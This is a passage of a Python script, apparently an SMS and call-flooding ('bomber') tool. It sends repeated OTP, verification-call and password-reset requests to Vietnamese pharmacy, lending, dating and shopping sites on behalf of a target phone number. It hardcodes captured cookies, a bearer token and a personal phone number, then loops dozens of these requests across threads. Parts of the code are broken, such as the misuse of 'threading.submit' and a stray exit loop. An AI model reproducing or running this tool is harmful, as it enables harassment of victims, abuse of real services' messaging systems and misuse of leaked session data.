    "phoneNumber":phone,
    "otpType":0,
    "fromSys":"WEBKHLC",
}
    response=requests.post(
    "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
    headers=headers,
    json=json_data,
)
def ymet(phone):
    headers={
    "authority":"api.ymeet.me",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjowLCJpcF9hZGRyZXNzIjpudWxsLCJpYXQiOjE0ODIzOTEyOTcsImV4cCI6ODk0NzM1MTI5N30.mu8vXYKUa4d1h4FzDxlS6v1D8gj5_ICqPKFMkzxEZkE",
    "cache-control":"no-cache",
    "origin":"https://m.ymeet.me",
    "pragma":"no-cache",
    "referer":"https://m.ymeet.me/",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
}
    params={
    "phone_number":phone,
}
    response=requests.get("https://api.ymeet.me/phone_check",params=params,headers=headers)
def kate(phone):
    cookies={
    "_gcl_au":"1.1.2063329082.1690871730",
    "_fbp":"fb.1.1690871731129.1340598999",
    "_tt_enable_cookie":"1",
    "_ttp":"C6vVfPHKPUUL-0C2MwEylUVNG6y",
    "_fw_crm_v":"b83b33af-ca81-457e-c54b-42a6ec7b9cb0",
    "_hjSessionUser_2281843":"eyJpZCI6IjI2OGNiMGEwLWI4MzQtNTY5Yi1iMzBlLTMxMDU4OGM4MDBjZSIsImNyZWF0ZWQiOjE2OTA4NzE3MzEwNjksImV4aXN0aW5nIjp0cnVlfQ==",
    "_hjSessionUser_2281853":"eyJpZCI6ImY3YzYwOThlLTZlZmItNTZmMC1iN2U5LTllOGZiOTNjMDliMSIsImNyZWF0ZWQiOjE2OTA4NzE3NTA5MzAsImV4aXN0aW5nIjp0cnVlfQ==",
    "_ga_K15C064VTW":"GS1.2.1691483447.4.0.1691483447.60.0.0",
    "_ga_03H0F9NHEX":"GS1.2.1691483452.4.1.1691483462.50.0.0",
    "_gid":"GA1.2.885131729.1696068263",
    "_gac_UA-187725374-2":"1.1696068263.Cj0KCQjwjt-oBhDKARIsABVRB0xKGKNXw9z7gMZ0ZSGQWE7SNzJFdFfY9kDjczjguJQUNluus7qt75YaAhPHEALw_wcB",
    "_gat_UA-187725374-2":"1",
    "_hjIncludedInSessionSample_2281843":"0",
    "_hjSession_2281843":"eyJpZCI6ImY4MDgzMDhmLTM0YmMtNGU3ZS04MmQwLTZkMjhkNGMzMTk1OCIsImNyZWF0ZWQiOjE2OTYwNjgyNjM0NjIsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9",
    "_hjAbsoluteSessionInProgress":"1",
    "_gat_UA-187725374-1":"1",
    "_hjIncludedInSessionSample_2281853":"0",
    "_hjSession_2281853":"eyJpZCI6IjA1YmY0NDI2LWE2ZmMtNDM3MC1iYjI3LWVhOGE3ZmU1NGE3ZCIsImNyZWF0ZWQiOjE2OTYwNjgyNzIwNjksImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9",
    "_ga_ZBQ18M247M":"GS1.1.1696068263.8.1.1696068295.28.0.0",
    "_cabinet_key":"SFMyNTY.g3QAAAAGbQAAAAZhbW91bnRtAAAACDEwMDAwMDAwbQAAAAljbGllbnRfaWRiABgBaW0AAAAObGVhZGdlbmVyYXRpb250AAAAAW0AAAAKMTY5NjA2ODI5NnQAAAANbQAAAAZhbW91bnRtAAAACDEwMDAwMDAwbQAAAANnYWRtAAAAATFtAAAABWdjbGlkbQAAAFxDajBLQ1Fqd2p0LW9CaERLQVJJc0FCVlJCMHhLR0tOWHc5ejdnTVowWlNHUVdFN1NOekpGZEZmWTlrRGpjempndUpRVU5sdXVzN3F0NzVZYUFoUEhFQUx3X3djQm0AAAAFcGhvbmVtAAAACjAzMjU1NDA1MzVtAAAAB3JlZmVyYWxtAAABnnBob25lPTAzMjU1NDA1MzUmYW1vdW50PTEwMDAwMDAwJnRlcm09MzAmdXRtX3NvdXJjZT1nb29nbGVfcGVyZm9ybWFuY2UmdXRtX21lZGl1bT1UaGFuaEJpbmgtVEtNJnV0bV9jYW1wYWlnbj1nb29nbGVfcGVyZm9ybWFuY2VfY3BjX1ZIX0FsbF9UaGFuaEJpbmhfMSZ1dG1fdGVybT1nb29nbGVfcGVyZm9ybWFuY2VfY3BjX1ZIX0FsbF9UaGFuaEJpbmhfTmF0aW9uYWxXaWRlX01hc3NpdmVfMV8zJnV0bV9jb250ZW50PWdvb2dsZV9wZXJmb3JtYW5jZV9jcGNfVkhfQWxsX1RoYW5oQmluaF9OYXRpb25hbFdpZGVfTWFzc2l2ZV9US01fX18xXzNfMSZnYWQ9MSZnY2xpZD1DajBLQ1Fqd2p0LW9CaERLQVJJc0FCVlJCMHhLR0tOWHc5ejdnTVowWlNHUVdFN1NOekpGZEZmWTlrRGpjempndUpRVU5sdXVzN3F0NzVZYUFoUEhFQUx3X3djQm0AAAAEdGVybW0AAAACMzBtAAAABHRpbWViZRfyyG0AAAADdXJsbQAAAaxsay50YWtvbW8udm4vP3Bob25lPTAzMjU1NDA1MzUmYW1vdW50PTEwMDAwMDAwJnRlcm09MzAmdXRtX3NvdXJjZT1nb29nbGVfcGVyZm9ybWFuY2UmdXRtX21lZGl1bT1UaGFuaEJpbmgtVEtNJnV0bV9jYW1wYWlnbj1nb29nbGVfcGVyZm9ybWFuY2VfY3BjX1ZIX0FsbF9UaGFuaEJpbmhfMSZ1dG1fdGVybT1nb29nbGVfcGVyZm9ybWFuY2VfY3BjX1ZIX0FsbF9UaGFuaEJpbmhfTmF0aW9uYWxXaWRlX01hc3NpdmVfMV8zJnV0bV9jb250ZW50PWdvb2dsZV9wZXJmb3JtYW5jZV9jcGNfVkhfQWxsX1RoYW5oQmluaF9OYXRpb25hbFdpZGVfTWFzc2l2ZV9US01fX18xXzNfMSZnYWQ9MSZnY2xpZD1DajBLQ1Fqd2p0LW9CaERLQVJJc0FCVlJCMHhLR0tOWHc5ejdnTVowWlNHUVdFN1NOekpGZEZmWTlrRGpjempndUpRVU5sdXVzN3F0NzVZYUFoUEhFQUx3X3djQm0AAAAMdXRtX2NhbXBhaWdubQAAAClnb29nbGVfcGVyZm9ybWFuY2VfY3BjX1ZIX0FsbF9UaGFuaEJpbmhfMW0AAAALdXRtX2NvbnRlbnRtAAAASGdvb2dsZV9wZXJmb3JtYW5jZV9jcGNfVkhfQWxsX1RoYW5oQmluaF9OYXRpb25hbFdpZGVfTWFzc2l2ZV9US01fX18xXzNfMW0AAAAKdXRtX21lZGl1bW0AAAANVGhhbmhCaW5oLVRLTW0AAAAKdXRtX3NvdXJjZW0AAAASZ29vZ2xlX3BlcmZvcm1hbmNlbQAAAAh1dG1fdGVybW0AAABAZ29vZ2xlX3BlcmZvcm1hbmNlX2NwY19WSF9BbGxfVGhhbmhCaW5oX05hdGlvbmFsV2lkZV9NYXNzaXZlXzFfM20AAAAQb3RwX2xvZ2luX3Bhc3NlZGQABWZhbHNlbQAAAAVwaG9uZW0AAAALODQzMjU1NDA1MzVtAAAABHRlcm1tAAAAAjMw.HMkn2LYkpwd3XMhemF2D-wnzJ0juu-SxZ_vOkSYskoY",
    "_gcl_aw":"GCL.1696068298.Cj0KCQjwjt-oBhDKARIsABVRB0xKGKNXw9z7gMZ0ZSGQWE7SNzJFdFfY9kDjczjguJQUNluus7qt75YaAhPHEALw_wcB",
    "_ga_ZN0EBP68G5":"GS1.1.1696068271.8.1.1696068298.33.0.0",
    "_ga":"GA1.2.796997553.1690871731",
    "_gac_UA-187725374-1":"1.1696068301.Cj0KCQjwjt-oBhDKARIsABVRB0xKGKNXw9z7gMZ0ZSGQWE7SNzJFdFfY9kDjczjguJQUNluus7qt75YaAhPHEALw_wcB",
}
    headers={
    "authority":"lk.takomo.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://lk.takomo.vn",
    "pragma":"no-cache",
    "referer":"https://lk.takomo.vn/?phone=0325540535&amount=10000000&term=30&utm_source=google_performance&utm_medium=ThanhBinh-TKM&utm_campaign=google_performance_cpc_VH_All_ThanhBinh_1&utm_term=google_performance_cpc_VH_All_ThanhBinh_NationalWide_Massive_1_3&utm_content=google_performance_cpc_VH_All_ThanhBinh_NationalWide_Massive_TKM___1_3_1&gad=1&gclid=Cj0KCQjwjt-oBhDKARIsABVRB0xKGKNXw9z7gMZ0ZSGQWE7SNzJFdFfY9kDjczjguJQUNluus7qt75YaAhPHEALw_wcB",
    "sec-ch-ua":"\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
}
    json_data={
    "data":{
        "phone":phone,
        "code":"resend",
        "channel":"ivr",
},
}
    response=requests.post("https://lk.takomo.vn/api/4/client/otp/send",cookies=cookies,headers=headers,json=json_data)
def vamo(phone):
    cookies={
    "pll_language":"vi",
    "_gcl_au":"1.1.751492267.1690715601",
    "_hjSessionUser_3571755":"eyJpZCI6IjlkYWY0ZDhhLTM3NzctNTQ0Yy04YzA4LTQzMWRiZTM1MjJlOSIsImNyZWF0ZWQiOjE2OTA3MTU2MDEyMjgsImV4aXN0aW5nIjp0cnVlfQ==",
    "_ga_WZPTQSXYRC":"GS1.2.1690872285.2.1.1690873047.60.0.0",
    "affiliate_name":"crezu",
    "affiliate_token":"64f2d8ee660c680001a1ede8",
    "_gid":"GA1.2.1742818820.1695219449",
    "_hjIncludedInSessionSample_3571755":"0",
    "_hjSession_3571755":"eyJpZCI6IjkwZTZlMjgwLTkxYmEtNDRjZS1iN2QxLTc2MjAxYzMyOTk4ZCIsImNyZWF0ZWQiOjE2OTUyMTk0NTA5NDYsImluU2FtcGxlIjpmYWxzZX0=",
    "_hjAbsoluteSessionInProgress":"0",
    "_ga":"GA1.2.1399514656.1690715601",
    "_gat_UA-149015239-1":"1",
    "_ga_P468096ENT":"GS1.2.1695219450.7.1.1695219691.60.0.0",
    "_ga_1HXSGSN1HG":"GS1.1.1695219449.10.1.1695219696.0.0.0",
}
    headers={
    "authority":"vamo.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/json",
    "origin":"https://vamo.vn",
    "pragma":"no-cache",
    "referer":"https://vamo.vn/app/login",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
}
    json_data={
    "username":phone[1:11],
}
    response=requests.post(
    "https://vamo.vn/ws/api/public/login-with-otp/generate-otp",
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def tako(phone):
    cookies={
    "_gcl_au":"1.1.2063329082.1690871730",
    "_fbp":"fb.1.1690871731129.1340598999",
    "_tt_enable_cookie":"1",
    "_ttp":"C6vVfPHKPUUL-0C2MwEylUVNG6y",
    "_fw_crm_v":"b83b33af-ca81-457e-c54b-42a6ec7b9cb0",
    "_hjSessionUser_2281843":"eyJpZCI6IjI2OGNiMGEwLWI4MzQtNTY5Yi1iMzBlLTMxMDU4OGM4MDBjZSIsImNyZWF0ZWQiOjE2OTA4NzE3MzEwNjksImV4aXN0aW5nIjp0cnVlfQ==",
    "_hjSessionUser_2281853":"eyJpZCI6ImY3YzYwOThlLTZlZmItNTZmMC1iN2U5LTllOGZiOTNjMDliMSIsImNyZWF0ZWQiOjE2OTA4NzE3NTA5MzAsImV4aXN0aW5nIjp0cnVlfQ==",
    "_gac_UA-187725374-1":"1.1690881126.EAIaIQobChMI5_W49467gAMVR9cWBR3MNw9QEAAYASAAEgIDTfD_BwE",
    "_gcl_aw":"GCL.1691483447.Cj0KCQjwz8emBhDrARIsANNJjS43_kbo3DbaM_kK3FUzU0KWEl6YxOaP6d-8qUP2QonQOZ7T0L-f7c0aAh_DEALw_wcB",
    "_gac_UA-187725374-2":"1.1691483447.Cj0KCQjwz8emBhDrARIsANNJjS43_kbo3DbaM_kK3FUzU0KWEl6YxOaP6d-8qUP2QonQOZ7T0L-f7c0aAh_DEALw_wcB",
    "_ga_K15C064VTW":"GS1.2.1691483447.4.0.1691483447.60.0.0",
    "_ga_03H0F9NHEX":"GS1.2.1691483452.4.1.1691483462.50.0.0",
    "_gid":"GA1.2.413238482.1695221097",
    "_hjSession_2281843":"eyJpZCI6ImYyYjhhZjA3LTJiYmEtNDg0Yi04YWRiLTQ1MTViZDE3YTVlZCIsImNyZWF0ZWQiOjE2OTUyMjExMTYyOTksImluU2FtcGxlIjp0cnVlfQ==",
    "_hjAbsoluteSessionInProgress":"0",
    "_ga_ZBQ18M247M":"GS1.1.1695221096.7.1.1695221119.37.0.0",
    "_cabinet_key":"SFMyNTY.g3QAAAAGbQAAAAZhbW91bnRtAAAACDEwMDAwMDAwbQAAAAljbGllbnRfaWRiABgBaW0AAAAObGVhZGdlbmVyYXRpb250AAAAAW0AAAAKMTY5NTIyMTExOXQAAAALbQAAAAZhbW91bnRtAAAACDEwMDAwMDAwbQAAAAdjbGlja2lkbQAAABg2NTBiMDU0YWZlMWZlNjAwMDE4YTJlMGFtAAAABXBob25lbQAAAAowMzI1NTQwNTM1bQAAAAdyZWZlcmFsbQAAAJZwaG9uZT0wMzI1NTQwNTM1JmFtb3VudD0xMDAwMDAwMCZ0ZXJtPTMwJnV0bV9zb3VyY2U9bGVhZGJhYXphcl9jcHMmdXRtX21lZGl1bT1jcGEmdXRtX2NhbXBhaWduPWZvci1sZWFkJnV0bV9jb250ZW50PTImY2xpY2tpZD02NTBiMDU0YWZlMWZlNjAwMDE4YTJlMGFtAAAABHRlcm1tAAAAAjMwbQAAAAR0aW1lYmULBX9tAAAAA3VybG0AAACkbGsudGFrb21vLnZuLz9waG9uZT0wMzI1NTQwNTM1JmFtb3VudD0xMDAwMDAwMCZ0ZXJtPTMwJnV0bV9zb3VyY2U9bGVhZGJhYXphcl9jcHMmdXRtX21lZGl1bT1jcGEmdXRtX2NhbXBhaWduPWZvci1sZWFkJnV0bV9jb250ZW50PTImY2xpY2tpZD02NTBiMDU0YWZlMWZlNjAwMDE4YTJlMGFtAAAADHV0bV9jYW1wYWlnbm0AAAAIZm9yLWxlYWRtAAAAC3V0bV9jb250ZW50bQAAAAEybQAAAAp1dG1fbWVkaXVtbQAAAANjcGFtAAAACnV0bV9zb3VyY2VtAAAADmxlYWRiYWF6YXJfY3BzbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDMyNTU0MDUzNW0AAAAEdGVybW0AAAACMzA.bBGSO3cMNq20Ey0k0wrKx5qQw2fLO-rQBZxemLUkYjA",
    "_ga_ZN0EBP68G5":"GS1.1.1695221122.7.0.1695221123.59.0.0",
    "_hjIncludedInSessionSample_2281853":"0",
    "_hjSession_2281853":"eyJpZCI6IjE3MjFjMDg4LTU4NWQtNGExOC05Zjg2LWQyNzk3NzJmODk4MCIsImNyZWF0ZWQiOjE2OTUyMjExNDA0MTYsImluU2FtcGxlIjpmYWxzZX0=",
    "_ga":"GA1.2.796997553.1690871731",
}
    headers={
    "authority":"lk.takomo.vn",
    "accept":"application/json, text/plain, */*",
    "accept-language":"vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control":"no-cache",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://lk.takomo.vn",
    "pragma":"no-cache",
    "referer":"https://lk.takomo.vn/?phone=0325540535&amount=10000000&term=30&utm_source=leadbaazar_cps&utm_medium=cpa&utm_campaign=for-lead&utm_content=2&clickid=650b054afe1fe600018a2e0a",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-origin",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
}
    json_data={
    "data":{
        "phone":phone,
        "code":"resend",
        "channel":"ivr",
},
}
    response=requests.post("https://lk.takomo.vn/api/4/client/otp/send",cookies=cookies,headers=headers,json=json_data)
def vayvnd(phone):
    cookies={
    "_gcl_au":"1.1.1485182034.1690554215",
    "_fbp":"fb.1.1690554217850.2133224269",
    "_tt_enable_cookie":"1",
    "_ttp":"DoIV2Jy8PmDwkE5BeJGSsNaHzb5",
    "_ym_uid":"1690554219913867740",
    "_ym_d":"1690554219",
    "_ga":"GA1.2.1687428666.1690554217",
    "_gid":"GA1.2.1470678460.1695221728",
    "_gat_UA-151110385-1":"1",
    "_ym_isad":"2",
    "_ym_visorc":"b",
    "_ga_P2783EHVX2":"GS1.1.1695221727.10.1.1695221777.10.0.0",
}
    headers={
    "authority":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "cache-control":"no-cache",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "pragma":"no-cache",
    "referer":"https://vayvnd.vn/",
    "sec-ch-ua":"\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":"\"Windows\"",
    "sec-fetch-dest":"empty",
    "sec-fetch-mode":"cors",
    "sec-fetch-site":"same-site",
    "site-id":"3",
    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
}
    json_data={
    "login":phone,
}
    response=requests.post("https://api.vayvnd.vn/v2/users/password-reset",cookies=cookies,headers=headers,json=json_data)
def sendcall1(phone):
    while True:
        call1(phone)
        time.sleep(3)
        for b in range(amount):
            exit()
def BBot(phone, amount):
    for i in range(amount):
        threading.submit(tv360,phone)
        threading.submit(y360,phone)
        threading.submit(fb,phone)
        threading.submit(mocha,phone)
        threading.submit(dvcd,phone)
        threading.submit(myvt,phone)
        threading.submit(vayvnd,phone)
        threading.submit(dongpus,phone)
        threading.submit(one,phone)
        threading.submit(vieon,phone)
        threading.submit(phar,phone)
        threading.submit(fptshop,phone)
        threading.submit(kiotviet,phone)
        threading.submit(appota,phone)
        threading.submit(meta,phone)
        threading.submit(blu,phone)
        threading.submit(tgdt,phone)
        threading.submit(concung,phone)
        threading.submit(money,phone)
        threading.submit(winmart,phone)
        threading.submit(pop,phone)
        threading.submit(tamo,phone)
        threading.submit(alf,phone)
        threading.submit(one,phone)
        threading.submit(piza,phone)
        threading.submit(robot,phone)
        threading.submit(phuc,phone)
        threading.submit(emart,phone)
        threading.submit(hana,phone)
        threading.submit(med,phone)
        threading.submit(ghn,phone)
        threading.submit(shop,phone)
        threading.submit(khia,phone)
        threading.submit(ican,phone)
        threading.submit(gala,phone)
        threading.submit(f88,phone)
        threading.submit(ahamove,phone)
        threading.submit(lon,phone)
        threading.submit(ymet,phone)
        threading.submit(kate,phone)
        threading.submit(vamo,phone)
        threading.submit(tako,phone)
        threading.submit(vayvnd,phone)
BBot(phone, amount)